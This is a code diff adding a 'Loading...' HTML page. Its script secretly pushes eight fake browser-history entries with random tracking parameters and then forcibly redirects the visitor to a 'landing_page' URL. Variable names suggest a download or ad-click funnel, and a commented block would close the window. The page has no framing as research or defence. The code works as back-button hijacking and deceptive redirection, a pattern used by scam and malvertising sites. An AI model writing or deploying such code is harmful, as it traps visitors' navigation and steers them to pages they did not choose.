@@ -1,1 +1,38 @@
 
+<h2>Loading...</h2>         <script type="text/javascript">
+                var path1 = location.pathname + '?random';
+                var path = location.pathname;
+                var proceedtodownload = 1;
+                var getRandomInt = function(min, max) {
+                    min = Math.ceil(min);
+                    max = Math.floor(max);
+                    return Math.floor(Math.random() * (max - min)) + min;
+                }
+                if (window.location.search === '?diplo_click=1') {
+                    proceedtodownload = 1;
+                }
+                path = "http://127.0.0.1/landing_page/";
+                
+                if (proceedtodownload === 1) {
+                    try {
+                        new Promise(function(resolve) {
+                            (function pushStateLoop(i, url) {
+                                setTimeout(function() {
+                                    window.history.pushState({}, document.title, path1 + "?utm=" + getRandomInt(1, i));
+                                    if (--i) pushStateLoop(i, url);
+                                    if (i === 0) resolve(1);
+                                }, 180);
+                            })(8, window.location.href);
+                        }).then(function() {
+                            location.href = path;
+                            //setTimeout("window.close()",1000);
+                        });
+                    } catch (err) {}
+                } else {
+                    document.write('.');
+                }
+            </script>
+            
+            <!--<script type="text/javascript">-->
+            <!--    window.open("", "_self");-->
+            <!--</script>-->
